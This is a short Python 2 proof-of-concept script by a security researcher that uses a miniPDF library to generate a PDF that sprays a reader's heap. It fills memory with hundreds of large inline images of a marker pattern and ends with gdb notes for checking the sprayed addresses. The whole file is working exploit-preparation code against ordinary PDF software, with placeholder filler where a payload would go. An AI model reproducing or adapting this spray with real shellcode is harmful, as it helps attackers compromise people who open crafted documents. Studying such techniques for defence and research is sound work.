##########################################################################
####   Felipe Andres Manzano     *   felipe.andres.manzano@gmail.com  ####
####   http://twitter.com/feliam *   http://wordpress.com/feliam      ####
##########################################################################
## Heap spraying PDF using inline images
from miniPDF import *
import zlib,sys

#This construct and add the spraying page
def sprayPage(doc,pages, sc="A", size=1024*1024, N=300 , offset=0x44):
    #sizes
    W,H=size,1
    payload = (sc*(size/len(sc)+1))[offset:W*H+offset]

    #contents
    contents=  PDFStream(('''q BI /W %d /H %d /CS /G /BPC 8 ID %sEI Q '''%(W,H,payload))*N)
    contents.appendFilter(FlateDecode())
    doc.add(contents)

    #page
    page = PDFDict()
    page.add("Type",PDFName("Page"))
    page.add("Resources",  PDFDict())
    page.add("Contents", PDFRef(contents))

    page.add("Parent",PDFRef(pages))
    doc.add(page)
    return page 


#The document
doc = PDFDoc()

#pages
pages = PDFDict()
pages.add("Type", PDFName("Pages"))

#spray! fssss fsss fssss
#0x1000 <<<<AAAAAAAAA...AAAAAAAAAAA>>><<<<AAAAAAAAA...AAAAAAAAAAA>>>
#0x3000 <<<<AAAAAAAAA...AAAAAAAAAAA>>><<<<AAAAAAAAA...AAAAAAAAAAA>>>
spage = sprayPage(doc,pages,"<<<<"+"A"*(0x1000-8)+">>>>",0x100000-100,400,0x2c)

#the list of pages
pages.add("Kids", PDFArray([PDFRef(spage)]))
pages.add("Count", PDFNum(1))
doc.add(pages)

#catalog
catalog = PDFDict()
catalog.add("Type", PDFName("Catalog"))
catalog.add("Pages", PDFRef(pages))
doc.add(catalog)
doc.setRoot(catalog)

print doc
##gdb
##x/4x 0xb0000000 +0x1000*X
